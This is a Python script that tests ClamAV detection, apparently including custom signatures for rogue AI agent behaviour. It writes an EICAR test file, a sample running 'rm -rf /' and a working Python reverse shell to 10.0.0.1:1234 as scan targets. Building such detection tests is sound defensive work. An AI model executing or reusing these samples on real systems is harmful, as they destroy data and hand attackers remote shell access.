import os
import subprocess
import shutil

TEST_DIR = "tests/clamav_evaluation"
EICAR_STRING = r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"

def setup_test_files():
    if os.path.exists(TEST_DIR):
        shutil.rmtree(TEST_DIR)
    os.makedirs(TEST_DIR)

    # 1. Safe File
    with open(os.path.join(TEST_DIR, "safe.py"), "w") as f:
        f.write("print('Hello World')\n")

    # 2. EICAR Test File
    with open(os.path.join(TEST_DIR, "eicar.txt"), "w") as f:
        f.write(EICAR_STRING)

    # 3. Rogue: RM -RF
    with open(os.path.join(TEST_DIR, "rogue_rm.py"), "w") as f:
        f.write("import os\n")
        f.write("os.system('rm -rf /')\n")

    # 4. Rogue: Reverse Shell
    with open(os.path.join(TEST_DIR, "rogue_shell.py"), "w") as f:
        f.write("import socket\n")
        f.write("import subprocess\n")
        f.write("import os\n")
        f.write("s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n")
        f.write("s.connect(('10.0.0.1',1234))\n")
        f.write("os.dup2(s.fileno(),0)\n")
        f.write("os.dup2(s.fileno(),1)\n")
        f.write("os.dup2(s.fileno(),2)\n")
        f.write("p=subprocess.call(['/bin/sh','-i'])\n")

    print(f"Test files created in {TEST_DIR}")

def run_scan():
    print("Running clamscan...")
    try:
        # Run clamscan recursively on the test directory
        # -r: recursive
        # --no-summary: suppress summary (we'll parse output)
        result = subprocess.run(
            ["clamscan", "-r", TEST_DIR],
            capture_output=True,
            text=True
        )
        print(result.stdout)
        if result.stderr:
            print("Errors:", result.stderr)

        return result.stdout

    except FileNotFoundError:
        print("Error: clamscan not found. Is ClamAV installed?")
        return ""

def analyze_results(output):
    print("\n--- Analysis ---")
    lines = output.splitlines()
    detected = {}

    for line in lines:
        if "FOUND" in line:
            parts = line.split(":")
            filename = os.path.basename(parts[0])
            threat = parts[1].strip()
            detected[filename] = threat

    expected = {
        "eicar.txt": "Eicar-Signature", # Or similar
        "rogue_rm.py": "RogueAgent.DestructiveCommand",
        "rogue_shell.py": "RogueAgent.PythonReverseShell"
    }

    passed = True
    for filename, expected_threat in expected.items():
        if filename in detected:
            print(f"[PASS] {filename} detected as {detected[filename]}")
        else:
            print(f"[FAIL] {filename} was NOT detected.")
            passed = False

    if "safe.py" in detected:
        print(f"[FAIL] safe.py was falsely detected as {detected['safe.py']}")
        passed = False
    else:
        print(f"[PASS] safe.py was correctly ignored.")

    return passed

if __name__ == "__main__":
    setup_test_files()
    output = run_scan()
    if analyze_results(output):
        print("\nEvaluation: SUCCESS - ClamAV detected targeted threats.")
    else:
        print("\nEvaluation: FAILURE - Some threats were missed or false positives occurred.")
